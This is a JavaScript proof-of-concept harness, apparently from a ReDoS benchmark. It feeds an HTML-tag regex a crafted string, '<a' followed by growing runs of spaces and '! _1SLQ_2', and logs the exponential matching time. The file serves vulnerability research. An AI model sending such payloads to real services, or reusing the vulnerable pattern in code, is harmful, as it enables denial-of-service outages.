/* 6042
 * (<\/?)(?i:(?<element>a(bbr|cronym|ddress|pplet|rea)?|b(ase(font)?|do|ig|lockquote|ody|r|utton)?|c(aption|enter|ite|(o(de|l(group)?)))|d(d|el|fn|i(r|v)|l|t)|em|f(ieldset|o(nt|rm)|rame(set)?)|h([1-6]|ead|r|tml)|i(frame|mg|n(put|s)|sindex)?|kbd|l(abel|egend|i(nk)?)|m(ap|e(nu|ta))|no(frames|script)|o(bject|l|pt(group|ion))|p(aram|re)?|q|s(amp|cript|elect|mall|pan|t(r(ike|ong)|yle)|u(b|p))|t(able|body|d|extarea|foot|h|itle|r|t)|u(l)?|var))(\s(?<attr>.+?))*>
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"<a"+" "*32+"! _1SLQ_2"
 */
var REGEX = new RegExp("(<\/?)(?i:(?<element>a(bbr|cronym|ddress|pplet|rea)?|b(ase(font)?|do|ig|lockquote|ody|r|utton)?|c(aption|enter|ite|(o(de|l(group)?)))|d(d|el|fn|i(r|v)|l|t)|em|f(ieldset|o(nt|rm)|rame(set)?)|h([1-6]|ead|r|tml)|i(frame|mg|n(put|s)|sindex)?|kbd|l(abel|egend|i(nk)?)|m(ap|e(nu|ta))|no(frames|script)|o(bject|l|pt(group|ion))|p(aram|re)?|q|s(amp|cript|elect|mall|pan|t(r(ike|ong)|yle)|u(b|p))|t(able|body|d|extarea|foot|h|itle|r|t)|u(l)?|var))(\s(?<attr>.+?))*>")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '<a' + ' '.repeat(i*1) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}